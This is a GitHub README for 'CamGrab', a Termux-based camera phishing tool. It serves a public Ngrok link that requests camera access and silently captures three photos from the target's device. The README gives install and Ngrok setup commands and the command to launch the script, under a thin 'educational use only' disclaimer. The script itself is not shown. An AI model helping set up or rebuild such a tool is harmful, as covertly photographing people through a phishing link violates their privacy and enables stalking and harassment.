# CamGrab Tool (For Educational Use Only)

A Termux-based camera phishing tool that generates a public link using Ngrok and captures 3 pictures via the target's device camera.

> ⚠️ FOR EDUCATIONAL PURPOSES ONLY. DO NOT USE FOR ILLEGAL ACTIVITY.

## Features
- Generates a public link using Ngrok
- Requests camera access
- Captures 3 photos silently
- Saves images to `/sdcard/CamGrabs/`

## Requirements
```bash
pkg update && pkg install php git wget unzip curl -y
```

## Ngrok Setup
```bash
wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip
unzip ngrok-stable-linux-arm.zip
chmod +x ngrok
mv ngrok $PREFIX/bin/
ngrok authtoken YOUR_AUTH_TOKEN
```

## Usage
```bash
chmod +x camgrab.sh
./camgrab.sh
```

---

### 📸 Preview:
![demo](https://yourimageurl.com)

## Disclaimer
The developer is not responsible for any misuse. Use responsibly!

---

### GitHub Repository

This repo is maintained by [Mujaheed56](https://github.com/Mujaheed56).

Repository: [https://github.com/Mujaheed56/camgrab](https://github.com/Mujaheed56/camgrab)
